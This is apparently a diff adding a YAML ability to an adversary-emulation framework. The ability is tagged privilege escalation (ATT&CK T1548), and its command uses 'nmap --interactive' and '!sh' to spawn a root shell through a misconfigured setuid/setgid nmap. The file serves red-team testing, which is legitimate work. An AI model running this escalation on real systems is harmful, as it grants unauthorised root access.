@@ -1,0 +1,15 @@
+---
+
+- id: 6cc6c8e1-d7b3-4148-914f-b4ca1c04c8d6 
+  name: Use of GID bit on nmap
+  description: Abuse a misconfigured GID to gain root access
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548
+    name: Setuid and SetGid
+  platforms:
+    linux:
+      sh:
+        command: |
+          nmap --interactive;
+          !sh;
